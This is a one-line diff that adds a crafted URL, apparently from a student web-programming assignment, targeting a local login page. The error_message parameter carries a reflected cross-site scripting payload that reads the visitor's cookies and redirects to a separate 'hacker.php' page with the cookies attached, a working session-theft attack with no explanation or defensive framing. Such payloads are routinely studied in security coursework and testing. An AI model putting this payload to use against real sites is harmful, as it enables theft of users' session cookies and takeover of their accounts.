@@ -1,0 +1,1 @@
+http://localhost/web_programmming_asm3_group1/code/login-box.php?error_message=<script>let cookie = document.cookie; window.location.href=`http://localhost/cross_scripting/hacker.php?stolen-cookie=${cookie}`</script>
